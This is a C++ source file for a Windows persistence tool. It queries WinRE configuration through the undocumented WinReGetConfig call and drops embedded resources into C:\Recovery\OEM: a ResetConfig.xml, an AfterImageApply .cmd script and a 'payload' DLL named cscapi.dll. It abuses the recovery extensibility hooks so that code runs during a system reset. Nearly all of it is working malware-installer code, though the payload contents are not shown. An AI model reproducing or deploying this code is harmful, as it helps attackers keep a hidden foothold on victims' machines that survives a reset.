#include "winre.hpp"
#include "resource.h"
#pragma optimize ("", off)


IMPORTAPI(L"ReAgent.dll", WinReGetConfig, DWORD, LPCWSTR, PWINRE_CONFIG);

WinRe::FileManager::FileManager(void) 
{
	this->m_CoreFiles[WinRe::RESET_CONFIG_XML] = L"ResetConfig.xml";
	this->m_CoreFiles[WinRe::DEFAULT_EXTENSIBILITY_SCRIPT] = L"AfterImageApply_BDB0C1E8-6951-46C4-AB7F-C07B29F462FD.cmd";
	this->m_CoreFiles[WinRe::PAYLOAD_DLL] = L"cscapi.dll";
	this->m_RecoveryPath = L"C:\\Recovery\\OEM";
	this->setFiles = false;
	this->setFolder = false;
}

WinRe::WinReManager::WinReManager(void)
{
	ZeroMemory(&config, sizeof(config));
	config.SizeOfStruct = sizeof(config);
}

void WinRe::SecurityManager::CreateSetSecurityFolder(const std::wstring& folderPath)
{
	std::printf("\tTrying to create folder to: %ws\n", folderPath.data());
	const std::wstring separators(L"\\/");
	DWORD fileAttributes = GetFileAttributesW(folderPath.data());
	if (fileAttributes == INVALID_FILE_ATTRIBUTES){
		std::size_t slashIndex = folderPath.find_last_of(separators);
		if (slashIndex != std::wstring::npos){
			auto subfolder = folderPath.substr(0, slashIndex);
			std::printf("\tNot found %ws, recursively creating it\n", subfolder.data());
			CreateSetSecurityFolder(subfolder);
		}
		BOOL result = ::CreateDirectoryW(folderPath.data(), nullptr);
		if (result == FALSE){
			throw std::runtime_error("Could not create payload directory.");
		}
		std::printf("\tSucessfully created: %ws\n", folderPath.data());
	}
	else {
		std::printf("\tFile attributes found for: %ws\n", folderPath.data());
		bool isDirectory = (fileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
		if (!isDirectory){
			throw std::runtime_error("Could not create directory because a file with the same name exists");
		}
	}
	static_cast<WinRe::FileManager*>(this)->setFolder = true;
}

auto WinRe::WinReManager::GetCurrentWinReInformation(void) -> std::tuple <bool, LPCWSTR>
{
	std::cout << "[0] Currently getting data information from undocumented function WinReGetConfig\n";
	if (!WinReGetConfig(nullptr, &config)) 
	{
		std::cerr << "ERROR: Could not call and get WinRE information from undocumented function. (Is it updated?)\n";
		throw std::exception("Error extracting WinRe information.");
	}
	return std::make_tuple(config.InfoWinRe.dwFlagIsEnabled ? true : false, config.InfoWinRe.WimInstalledLocation);
}

void WinRe::FileManager::ScanAndSetDirectoryRecovery(void)
{
	DWORD dwDirAttrib { GetFileAttributesW(m_RecoveryPath.data()) };
	bool isValidDir { false };
	if (dwDirAttrib != INVALID_FILE_ATTRIBUTES and dwDirAttrib & FILE_ATTRIBUTE_DIRECTORY) {

		isValidDir = true;
	}
	if (isValidDir) {
		std::printf("[2] The Windows OEM recovery exists. Checking existent core files next.\n");
		setFolder = isValidDir;
	}
	else{
		DWORD dwErrorCode = GetLastError();
		if (dwErrorCode == ERROR_PATH_NOT_FOUND or dwErrorCode == ERROR_FILE_NOT_FOUND){
			std::cout << "[2] The Windows OEM recovery does not exists. Creating the new folder" << std::endl;
			CreateSetSecurityFolder(m_RecoveryPath);
			std::printf("[2] Finished executing recursive folder creation.\n");
		}
		else {
			std::printf("Uninmplemented error for SCAN OEM folder, errorCode is: 0x%x\n", GetLastError());
			throw std::runtime_error{ (std::string{"[2] Unimplemented error for Scan OEM Recovery folder, error code : "} + std::to_string(dwErrorCode)).c_str() };
		}
	}
}

void WinRe::FileManager::ScanAndSetCoreFiles(void)
{
	bool allFilesValid = true;
	for (auto &file : m_CoreFiles) {
		std::wstring path = m_RecoveryPath + L'\\' + file;
		DWORD dwFileAttrib{ GetFileAttributesW(path.data())};
		if (dwFileAttrib != INVALID_FILE_ATTRIBUTES){
			std::printf("[3] The file %ws exists. Replacement is needed\n", path.data());
		}
		else {
			std::printf("[3] The file %ws does not exist (LastError: 0x%x). Creation is needed\n", path.data(), GetLastError());
		}
		if (!CreateSetSecurityFiles(path)){
			char tmp[MAX_PATH];
			allFilesValid = false;
			sprintf_s(tmp, MAX_PATH, "%ls", path.data());
			throw std::exception{ (std::string{"Error replacing one of the core payload files: "} + std::string(tmp) +
				std::string{"with error code: " } + std::to_string(GetLastError())).c_str()};
		}
	}
	this->setFiles = allFilesValid;
}

bool WinRe::SecurityManager::DropResourceToFile(HANDLE& hFile, const DWORD dwIDRes) noexcept
{
	HMODULE hMod = GetModuleHandleA(NULL);
	HRSRC hResource = FindResource(hMod, MAKEINTRESOURCE(dwIDRes), L"RT_RCDATA");
	if (hResource == NULL)
	{
		printf("Could not find the payload dll resource, exiting...\n");
		return false;
	}
	DWORD dwSizeResource = SizeofResource(hMod, hResource);
	HGLOBAL hResLoaded = LoadResource(hMod, hResource);
	if (hResLoaded == NULL)
	{
		printf("Could not find the dll layout, exiting...\n");
		return false;
	}
	auto pBuffer = static_cast<BYTE*> (LockResource(hResLoaded));
	DWORD dwNumberBytesWritten;
	if (!WriteFile(hFile, pBuffer, dwSizeResource, &dwNumberBytesWritten, nullptr))
	{
		std::printf("Could not write to file, last error is %d\n", GetLastError());
		CloseHandle(hFile);
		return false;
	}
	std::printf("\tWriting payload successfull for idResource: %d\n", dwIDRes);
	CloseHandle(hFile);
	return true;
}

const std::wstring& WinRe::FileManager::GetCoreFile(CORE_FILES index) noexcept
{
	return m_CoreFiles[index];
}


DWORD WinRe::SecurityManager::GetIdentifierRes(auto FilePath)
{
	DWORD dwResource = NULL;

	//std::printf("Value test is: %ws\n", static_cast<FileManager*>(this)->GetCoreFile(WinRe::RESET_CONFIG_XML).data());
	if (FilePath.find(static_cast<FileManager*>(this)->GetCoreFile(WinRe::PAYLOAD_DLL).data()) != std::wstring::npos)
	{
		dwResource = IDR_DLL_PAYLOAD;
	}
	else if (FilePath.find(static_cast<FileManager*>(this)->GetCoreFile(WinRe::RESET_CONFIG_XML).data()) != std::wstring::npos){
		dwResource = IDR_RESET_CONFIG;
	}
	else if (FilePath.find(static_cast<FileManager*>(this)->GetCoreFile(WinRe::DEFAULT_EXTENSIBILITY_SCRIPT).data()) != std::wstring::npos)
	{
		dwResource = IDR_CMD_SCRIPT;
	}
	return dwResource;
}

bool WinRe::SecurityManager::CreateSetSecurityFiles(const std::wstring& FilePath) noexcept
{
	bool isValid = false;
	HANDLE hFile{ CreateFileW(FilePath.data(), GENERIC_READ | GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, 
				 FILE_ATTRIBUTE_NORMAL, NULL)};
	if (hFile == INVALID_HANDLE_VALUE) {
		std::cout << "Could not open file for replacement\n";
		return isValid;
	}
	std::printf("\tThe payload path %ws has a handle of: 0x%p\n", FilePath.data(), hFile);
	
	DWORD idResource = GetIdentifierRes(FilePath);
	std::printf("\tTrying to overwrite file: %ws from idResource: %d\n", FilePath.data(), idResource);
	if (DropResourceToFile(hFile, idResource)){
		isValid = true;
	}

	return isValid;
}
